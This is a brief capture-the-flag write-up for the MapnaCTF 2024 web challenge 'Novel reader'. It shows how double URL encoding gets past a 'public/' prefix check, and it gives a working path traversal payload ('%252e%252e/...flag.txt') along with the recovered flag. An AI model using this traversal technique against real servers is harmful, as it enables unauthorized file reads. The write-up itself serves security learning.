---
title: "Novel reader"
description: "We have many fun novels for ya..."
pubDate: 2024-01-22
ctf: "MapnaCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-mapnactf/icon.png"
---

The website seems to be an article reader with one article we cannot read, and we can only read a few words with our balance.

![Home Page](images/24-mapnactf/novel-reader-1.png)

I look into the web request for the article reading and the source code has the following segment:

```python
name = unquote(name)
if(not name.startswith('public/')):
    return {'success': False, 'msg': 'You can only read public novels!'}, 400
```

`unquote` from `urllib.parse` and does URL decoding, so we can avoid that with layering of url encoding. Eg. `%2e` -> `%252e`

We then see that the path has to start with `public/` to be read.

We can achieve path traversal to read the flag using the following payload: `public/%252e%252e/%252e%252e/flag.txt`

Making the final web request to `/api/read/%252e%252e/%252e%252e/flag.txt` gives us the flag.

Flag: `MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17>0-4b331d4b}`